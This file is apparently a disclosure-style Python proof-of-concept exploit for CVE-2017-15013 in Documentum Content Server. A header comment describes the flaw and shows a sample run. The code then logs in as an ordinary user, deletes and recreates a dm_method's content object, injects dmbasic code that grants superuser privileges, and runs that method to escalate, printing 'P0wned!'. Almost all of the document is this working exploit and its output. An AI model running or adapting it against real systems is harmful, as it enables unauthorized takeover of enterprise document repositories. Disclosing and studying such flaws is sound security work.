@@ -1,0 +1,286 @@
+#!/usr/bin/env python
+
+# Opentext Documentum Content Server (formerly known as EMC Documentum Content Server)
+# contains following design gap, which allows authenticated user to gain privileges
+# of superuser:
+#
+# Content Server stores information about uploaded files in dmr_content objects,
+# which are queryable and "editable" (before release 7.2P02 any authenticated user
+# was able to edit dmr_content objects, now any authenticated user may delete
+# dmr_content object and them create new one with the old identifier) by
+# authenticated users, this allows any authenticated user to "modify" security-sensitive
+# dmr_content objects (for example, dmr_content related to dm_method objects)
+# and gain superuser privileges
+#
+# The PoC below demonstrates this vulnerability:
+#
+# MacBook-Pro:~ $ python CVE-2017-15013.py
+# usage:
+# CVE-2017-15013.py host port user password
+# MacBook-Pro:~ $ python CVE-2017-15013.py docu72dev01 10001 dm_bof_registry dm_bof_registry
+# Trying to connect to docu72dev01:10001 as dm_bof_registry ...
+# Connected to docu72dev01:10001, docbase: DCTM_DEV, version: 7.2.0270.0377  Linux64.Oracle
+# Trying to find any dm_method object with content...
+#     Trying to poison docbase method dm_Migration
+# Method verb: dmbasic -eMigration_Agent
+# Method function: Migration_Agent
+# Trying to inject new content:
+# Const glabel As String          = "Label"
+# Const ginfo As String           = "Info"
+# Const gerror As String          = "Error"
+#
+# Private Sub PrintMessage(mssg As String, mssgtype As String)
+# If(mssgtype=glabel) Then
+# Print "<BR><B><FONT size=3>"
+# Print mssg
+# print "</FONT></B>"
+# ElseIf(mssgtype=ginfo) Then
+# Print "<BR><FONT color=blue>"
+# Print mssg
+# print "</FONT>"
+# ElseIf(mssgtype=gerror) Then
+# Print "<BR><FONT color=red size=3>"
+# Print mssg
+# print "</FONT>"
+# Else
+# Print "<BR>" & mssg
+# End If
+# End Sub
+# Private Sub SetupSuperUser(TargetUser As String)
+# objectid$ = dmAPIGet("id,c,dm_user where user_name = '" & TargetUser & "'")
+# If objectid$ <> "" then
+# Status = dmAPISet("set,c," & objectid$ & ",user_privileges",16)
+# Status = dmAPIExec("save,c," & objectid$)
+# End If
+# End Sub
+#
+# Sub Migration_Agent(DocbaseName As String, UserName As String, TargetUser As String)
+# Dim SessionID As String
+#
+# SessionID= dmAPIGet("connect," & DocbaseName & "," & UserName & ",")
+# If SessionID ="" Then
+# Print "Fail to connect to docbase " & DocbaseName &" as user " & UserName
+# DmExit(-1)
+# Else
+# Print "Connect to docbase " & DocbaseName &" as user " & UserName
+# End If
+#
+# Call SetupSuperUser(TargetUser)
+#
+# End Sub
+#
+# Removing method's content
+# method's content has been successfully removed
+# Creating malicious dmr_content object
+# Malicious dmr_content object has been successfully created
+# Becoming superuser...
+# P0wned!
+# MacBook-Pro:~ $ python CVE-2017-15013.py docu72dev01 10001 dm_bof_registry dm_bof_registry
+# Trying to connect to docu72dev01:10001 as dm_bof_registry ...
+# Connected to docu72dev01:10001, docbase: DCTM_DEV, version: 7.2.0270.0377  Linux64.Oracle
+# Current user is a superuser, nothing to do
+#
+
+
+
+import socket
+import sys
+
+from dctmpy import NULL_ID, RPC_APPLY_FOR_BOOL, RPC_APPLY_FOR_OBJECT
+
+from dctmpy.docbaseclient import DocbaseClient
+from dctmpy.obj.typedobject import TypedObject
+
+CIPHERS = "ALL:aNULL:!eNULL"
+
+
+def usage():
+    print "usage:\n%s host port user password" % sys.argv[0]
+
+
+def main():
+    if len(sys.argv) != 5:
+        usage()
+        exit(1)
+
+    (session, docbase) = create_session(*sys.argv[1:5])
+
+    if is_super_user(session):
+        print "Current user is a superuser, nothing to do"
+        exit(1)
+
+    print "Trying to find any dm_method object with content..."
+    method_object = session.get_by_qualification(
+        "dm_method WHERE use_method_content=TRUE "
+        "and method_verb like 'dmbasic -e%'")
+    method_content = session.get_by_qualification(
+        "dmr_content where any parent_id='%s'"
+        % method_object['r_object_id'])
+
+    print "Trying to poison docbase method %s" % method_object['object_name']
+    method_verb = method_object['method_verb']
+    print "Method verb: %s" % method_verb
+    method_function = method_verb[len("dmbasic -e"):]
+    print "Method function: %s" % method_function
+    new_content = \
+        "Const glabel As String          = \"Label\"\n" \
+        "Const ginfo As String           = \"Info\"\n" \
+        "Const gerror As String          = \"Error\"\n" \
+        "\n" \
+        "Private Sub PrintMessage(mssg As String, mssgtype As String)\n" \
+        "  If(mssgtype=glabel) Then\n" \
+        "            Print \"<BR><B><FONT size=3>\"\n" \
+        "            Print mssg\n" \
+        "            print \"</FONT></B>\"\n" \
+        "  ElseIf(mssgtype=ginfo) Then\n" \
+        "            Print \"<BR><FONT color=blue>\"\n" \
+        "            Print mssg\n" \
+        "            print \"</FONT>\"\n" \
+        "  ElseIf(mssgtype=gerror) Then\n" \
+        "            Print \"<BR><FONT color=red size=3>\"\n" \
+        "            Print mssg\n" \
+        "            print \"</FONT>\"\n" \
+        "  Else\n" \
+        "            Print \"<BR>\" & mssg\n" \
+        "  End If\n" \
+        "End Sub\n" \
+        "Private Sub SetupSuperUser(TargetUser As String)\n" \
+        "   objectid$ = dmAPIGet(\"id,c,dm_user where user_name = '\" & TargetUser & \"'\")\n" \
+        "   If objectid$ <> \"\" then\n" \
+        "      Status = dmAPISet(\"set,c,\" & objectid$ & \",user_privileges\",16)\n" \
+        "      Status = dmAPIExec(\"save,c,\" & objectid$)\n" \
+        "   End If\n" \
+        "End Sub\n" \
+        "\n" \
+        "Sub %s(DocbaseName As String, UserName As String, TargetUser As String)\n" \
+        "  Dim SessionID As String\n" \
+        "\n" \
+        "  SessionID= dmAPIGet(\"connect,\" & DocbaseName & \",\" & UserName & \",\")\n" \
+        "  If SessionID =\"\" Then\n" \
+        "    Print \"Fail to connect to docbase \" & DocbaseName &\" as user \" & UserName\n" \
+        "    DmExit(-1)\n" \
+        "  Else\n" \
+        "    Print \"Connect to docbase \" & DocbaseName &\" as user \" & UserName\n" \
+        "  End If\n" \
+        "\n" \
+        "  Call SetupSuperUser(TargetUser)\n" \
+        "\n" \
+        "End Sub\n" % method_function
+    print "Trying to inject new content:\n%s" % new_content
+
+    session.apply(None, NULL_ID, "BEGIN_TRANS")
+
+    if method_content is not None:
+        print "Removing method's content"
+        remove = TypedObject(session=session)
+        remove.set_string("OBJECT_TYPE", "dmr_content")
+        remove.set_int("i_vstamp", method_content['i_vstamp'])
+        obj = session.apply(RPC_APPLY_FOR_BOOL, method_content['r_object_id'], "dmDisplayConfigExpunge", remove)
+        if obj != True:
+            print "Failed to remove method's content, exiting"
+            end_tran(session, False)
+            exit(1)
+        print "method's content has been successfully removed"
+
+    store = session.get_by_qualification("dm_store")
+    format = session.get_by_qualification("dm_format where name='crtext'")
+
+    handle = session.make_pusher(store['r_object_id'])
+    if handle < 1:
+        print "Unable to create pusher"
+        end_tran(session, False)
+        exit(1)
+
+    b = bytearray()
+    b.extend(new_content)
+
+    if not session.start_push(handle, method_object['i_contents_id'], format['r_object_id'], len(b)):
+        print "Failed to start push"
+        end_tran(session, False)
+        exit(1)
+
+    session.upload(handle, b)
+    data_ticket = session.end_push_v2(handle)['DATA_TICKET']
+
+    print "Creating malicious dmr_content object"
+    content = TypedObject(session=session)
+    content.set_string("OBJECT_TYPE", "dmr_content")
+    content.set_bool("IS_NEW_OBJECT", True)
+    content.set_id("storage_id", store['r_object_id'])
+    content.set_id("format", format['r_object_id'])
+    content.set_int("data_ticket", data_ticket)
+    content.set_id("parent_id", method_object['r_object_id'])
+    content.set_int("page", 0)
+    content.set_string("full_format", format['name'])
+    content.set_int("content_size", len(b))
+    if not session.save_cont_attrs(method_object['i_contents_id'], content):
+        print "Failed to create content"
+        end_tran(session, False)
+        exit(1)
+
+    print "Malicious dmr_content object has been successfully created"
+
+    end_tran(session, True)
+
+    print "Becoming superuser..."
+    method = TypedObject(session=session)
+    method.set_string("METHOD", method_object['object_name'])
+    method.set_string("ARGUMENTS", "%s %s %s" % (
+        session.docbaseconfig['object_name'],
+        session.serverconfig['r_install_owner'],
+        sys.argv[3]))
+    session.apply(RPC_APPLY_FOR_OBJECT, NULL_ID, "DO_METHOD", method)
+    r = session.query(
+        "SELECT user_privileges FROM dm_user "
+        "WHERE user_name=USER") \
+        .next_record()[
+        'user_privileges']
+    if r != 16:
+        print "Failed"
+        exit(1)
+    print "P0wned!"
+
+
+def end_tran(session, commit=False):
+    obj = TypedObject(session=session)
+    obj.set_bool("COMMIT", commit)
+    session.apply(None, NULL_ID, "END_TRANS", obj)
+
+
+def create_session(host, port, user, pwd):
+    print "Trying to connect to %s:%s as %s ..." % (host, port, user)
+    session = None
+    try:
+        session = DocbaseClient(
+            host=host, port=int(port),
+            username=user, password=pwd)
+    except socket.error, e:
+        if e.errno == 54:
+            session = DocbaseClient(
+                host=host, port=int(port),
+                username=user, password=pwd,
+                secure=True, ciphers=CIPHERS)
+        else:
+            raise e
+    docbase = session.docbaseconfig['object_name']
+    version = session.serverconfig['r_server_version']
+    print "Connected to %s:%s, docbase: %s, version: %s" % \
+          (host, port, docbase, version)
+    return (session, docbase)
+
+
+def is_super_user(session):
+    user = session.get_by_qualification("dm_user WHERE user_name=USER")
+    if user['user_privileges'] == 16:
+        return True
+    group = session.get_by_qualification(
+        "dm_group where group_name='dm_superusers' "
+        "AND any i_all_users_names=USER")
+    if group is not None:
+        return True
+
+    return False
+
+
+if __name__ == '__main__':
+    main()
